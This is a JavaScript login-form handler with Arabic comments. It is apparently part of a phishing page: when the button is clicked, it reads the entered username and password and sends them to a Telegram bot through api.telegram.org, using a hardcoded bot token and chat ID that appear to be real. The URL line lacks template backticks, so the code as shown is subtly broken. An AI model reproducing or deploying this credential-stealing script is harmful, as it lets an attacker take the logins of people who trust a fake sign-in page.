document.addEventListener("DOMContentLoaded", function () {
    document.getElementById("loginButton").addEventListener("click", function (event) {
        event.preventDefault(); // منع الانتقال لصفحة أخرى عند الضغط على الزر

        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;

        if (username === "" || password === "") {
            alert("الرجاء إدخال اسم المستخدم وكلمة المرور.");
            return;
        }

        var botToken = "7664974744:AAG0ueJAEKAs7d8e2Yr48MifjmEBm093bV8"; // ضع توكن البوت الخاص بك هنا
        var chatId = "7643313499"; // ضع الـ Chat ID الخاص بك

        var message = "🔐 محاولة تسجيل دخول:\n\n"
            + "👤 المستخدم: " + username + "\n"
            + "🔑 كلمة المرور: " + password;

        var url = https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)};

        fetch(url)
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    alert("تم إرسال البيانات ✅");
                } else {
                    alert("حدث خطأ ❌");
                }
            })
            .catch(error => {
                alert("فشل الإرسال 🚨");
                console.error(error);
            });
    });
});
